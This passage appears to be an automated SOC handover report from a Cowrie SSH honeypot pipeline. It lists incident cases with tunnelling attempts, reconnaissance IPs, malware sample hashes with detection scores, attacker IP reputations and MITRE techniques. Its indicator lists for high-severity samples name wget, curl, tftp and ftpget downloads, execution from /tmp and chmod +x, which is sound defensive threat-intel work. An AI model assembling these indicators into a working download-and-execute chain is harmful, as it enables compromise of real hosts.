| `2026-08-22 16:50:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:50:03` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f6f5c66348d

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-22 16:50 |
| **Last Seen** | 2026-08-22 16:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:50:08` | `cowrie.session.connect` |
| `2026-08-22 16:50:09` | `cowrie.client.version` |
| `2026-08-22 16:50:09` | `cowrie.client.kex` |
| `2026-08-22 16:50:11` | `cowrie.login.success` |
| `2026-08-22 16:50:12` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02c30318780

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:50 |
| **Last Seen** | 2026-08-22 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:50:09` | `cowrie.session.connect` |
| `2026-08-22 16:50:09` | `cowrie.client.version` |
| `2026-08-22 16:50:09` | `cowrie.client.kex` |
| `2026-08-22 16:50:10` | `cowrie.login.success` |
| `2026-08-22 16:50:10` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:50:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:50:10` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-08-22 15:00 | 2026-08-22 16:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `74.128.77[.]247` | **4** | 2026-08-22 15:32 | 2026-08-22 15:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.127.181[.]140` | **3** | 2026-08-22 16:05 | 2026-08-22 16:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `208.96.121[.]222` | **3** | 2026-08-22 16:35 | 2026-08-22 16:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `68.33.233[.]154` | **3** | 2026-08-22 16:03 | 2026-08-22 16:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.169.161[.]242` | **2** | 2026-08-22 16:12 | 2026-08-22 16:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.59.88[.]232` | **2** | 2026-08-22 15:25 | 2026-08-22 16:32 | 4m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]207` | 1 | 2026-08-22 15:16 | 2026-08-22 15:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.22[.]219` | 1 | 2026-08-22 15:13 | 2026-08-22 15:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.99.190[.]167` | 1 | 2026-08-22 16:48 | 2026-08-22 16:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `148.3.11[.]214` | 1 | 2026-08-22 16:28 | 2026-08-22 16:28 | 12s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]56` | 1 | 2026-08-22 16:08 | 2026-08-22 16:09 | 10s | 0 | `T1592` | 🟢 LOW |
| `37.54.214[.]189` | 1 | 2026-08-22 15:40 | 2026-08-22 15:41 | 12s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-08-22 16:07 | 2026-08-22 16:07 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.229.85[.]227` | 1 | 2026-08-22 16:28 | 2026-08-22 16:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.229.85[.]230` | 1 | 2026-08-22 16:29 | 2026-08-22 16:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-08-22 15:36 | 2026-08-22 15:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]22` | 1 | 2026-08-22 15:13 | 2026-08-22 15:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-08-22 16:50 | 2026-08-22 16:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.226.56[.]106` | 1 | 2026-08-22 16:50 | 2026-08-22 16:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]19` | 1 | 2026-08-22 15:28 | 2026-08-22 15:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]84` | 1 | 2026-08-22 15:08 | 2026-08-22 15:08 | 2s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-08-22 16:25 | 2026-08-22 16:26 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `80.191.253[.]228` | IR | Toseae Ertebatat Parnian Amol | **100** ⚠️ | 2 |
| `46.4.112[.]25` | DE | Hetzner Online GmbH | **100** ⚠️ | 0 |
| `120.48.22[.]219` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `104.152.52[.]207` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |
| `39.104.64[.]139` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `172.127.181[.]140` | US | AT&T Enterprises, LLC | **100** ⚠️ | 0 |
| `74.128.77[.]247` | US | Charter Communications Inc | **100** ⚠️ | 0 |
| `220.246.46[.]144` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `165.169.161[.]242` | RE | Reunicable SAS | **100** ⚠️ | 0 |
| `89.248.172[.]11` | NL | FiberXpress BV | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 133 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 125 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 58 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 57 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 57 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 19 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 186 cases |
| Tool 34  | Credential Extractor        | ✅ 141 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (12.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 71 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 16 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 125 priority case(s) shown individually · 23 recon entry/entries in table (7 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-22T18:37:22Z_
